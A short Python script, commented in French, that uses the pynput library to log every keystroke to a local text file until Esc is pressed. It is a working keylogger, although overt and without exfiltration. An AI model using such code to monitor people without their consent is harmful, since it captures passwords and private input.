from pynput import keyboard
import os

# Obtenir le chemin du répertoire où se trouve le script Python
script_dir = os.path.dirname(os.path.abspath(__file__))
# Créer le chemin complet pour le fichier de log
log_file = os.path.join(script_dir, "key_log.txt")

def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char'):
                f.write(key.char)
            elif key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            else:
                f.write(f"[{key.name}]")
    except Exception as e:
        print(f"Error writing to file: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print(f"Key presses recorded in '{log_file}'")